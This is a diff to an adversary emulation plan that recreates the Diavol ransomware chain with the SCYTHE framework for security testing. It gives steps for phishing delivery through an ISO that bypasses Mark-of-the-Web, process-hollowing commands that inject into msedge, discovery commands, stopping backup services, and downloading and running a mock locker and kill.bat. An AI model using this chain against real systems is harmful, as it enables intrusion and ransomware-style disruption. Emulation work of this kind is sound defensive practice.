@@ -1,10 +1,10 @@
-# Diavol Ransomware Adversary Emulation Plan
+# Diavol Ransomware - Adversary Emulation Plan
 
 This threat is based on The DFIR Report post on December 13, 2021: https://thedfirreport.com/2021/12/13/diavol-ransomware/
 
 This is a multi-stage threat that requires multiple SCYTHE campaigns for end-to-end execution. The initial access procedures leverage multiple defense evasion steps that would be wise to test in your enviornment.
 
-## Automated Emulation with SCYTHE
+## Automated Adversary Emulation with SCYTHE
 ### Diavol Stage 0
 1. Download and import the threats in JSON format to your SCYTHE instance
 2. Download the Virtual File System (VFS) files under Diavol/VFS
@@ -14,7 +14,7 @@ This is a multi-stage threat that requires multiple SCYTHE campaigns for end-to-
 6. Launch the Campaign
 7. Download payload in DLL format setting the entry-point to `BasicScore`
 8. Save the DLL as `SharedFiles.dll`
-9. Start Stage 1, 2, and Stage 3 before execution
+9. Start Stage 1, 2, 3, and 4 before execution
 10. Follow steps for preparing initial access
 
 ### Diavol Stage 1
@@ -40,6 +40,14 @@ This is a multi-stage threat that requires multiple SCYTHE campaigns for end-to-
 5. Save the DLL as `uvvfvnnswte.dll`
 6. Upload the `uvvfvnnswte.dll` to the VFS under VFS:/shared/Diavol
 
+### Diavol Stage 4
+1. Create a new campaign `DiavolStage4` with HTTPS and the communication options from the CTI. You can import from the config.json on this GitHub or manually set it to: `--cp yourdomain[.]com:443 --secure true --multipart 10240 --heartbeat 5 --jitter 10`
+2. Import from Existing Threat: DiavolStage4
+3. Launch the Campaign
+4. Download payload in EXE.
+5. Save the EXE as `CryptoLocker64.exe`
+6. Upload the `CryptoLocker64.exe` to the VFS under VFS:/shared/Diavol
+
 ### Initial Access
 1. Copy the src folder from our [Compound Actions GitHub for T1553.005](https://github.com/scythe-io/compound-actions/tree/main/T1553.005%20-%20Mark-of-the-Web%20Bypass/src) to a working directory on your Windows system. Note we are using the Folder2Iso project to create the ISO.
 2. Put the SCYTHE DLL in the Folder2Iso of the working directory.
@@ -51,7 +59,8 @@ This is a multi-stage threat that requires multiple SCYTHE campaigns for end-to-
 8. Send a phishing email with the link to the Microsoft OneDrive zip file. 
 9. If the end user downloads the ZIP and double clicks the ISO, it will be mounted on their endpoint. The user will need to double click the shortcut to begin execution.
 
-## Manual Emulation
+## Manual Adversary Emulation
+This is a multi-stage attack leveraging multiple payloads and execution that perform different TTPs. Manual emulation steps are below.
 
 ### Diavol Stage 0
 1. Copy the src folder from our [Compound Actions GitHub for T1553.005](https://github.com/scythe-io/compound-actions/tree/main/T1553.005%20-%20Mark-of-the-Web%20Bypass/src) to a working directory on your Windows system. Note we are using the Folder2Iso project to create the ISO.
@@ -63,7 +72,8 @@ This is a multi-stage threat that requires multiple SCYTHE campaigns for end-to-
 7. Upload the zip file to Microsoft OneDrive and copy the link.
 8. Send a phishing email with the link to the Microsoft OneDrive zip file. 
 9. If the end user downloads the ZIP and double clicks the ISO, it will be mounted on their endpoint. The user will need to double click the shortcut to begin execution.
-10. Perform process injection into msedge to drop Diavol Stage 1.
+10. Load the process hollowing module: ```loader --load scythe.phollowing```
+11. Inject DiavolStage1 insto msedge: ```scythe.phollowing --src VFS:/shared/Diavol/DiavolStage1.exe --target C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe```
 
 ### Diavol Stage 1
 ```
@@ -131,7 +141,10 @@ run net localgroup administrators
 run whoami /all
 run net use
 run query user
-
+loader --load downloader
+downloader --src "VFS:/shared/Diavol/CryptoLocker64.exe" --dest "C:\ProgramData\CryptoLocker64.exe"
+run C:\ProgramData\CryptoLocker64.exe
+controller --shutdown
 ```
 
 ### Diavol Stage 4
@@ -158,5 +171,13 @@ net  stop BackupExecDeviceMediaService /y
 ```
 Create README_FOR_DECRYPT.txt and upload to VFS:/shared/Diavol/README_FOR_DECRYPT.txt
 ```
-
+This is an adversary emulation by SCYTHE. If this were a real threat actor, this would be a ransom note and your data would have been stolen and encrypted.
+```
+In the shell:
+```
+loader --load downloader
+downloader --src "VFS:/shared/Diavol/kill.bat" --dest "%USERPROFILE%\Desktop\kill.bat"
+loader --load run
+run cmd /c "start %USERPROFILE%\kill.bat"
+controller --shutdown
 ```
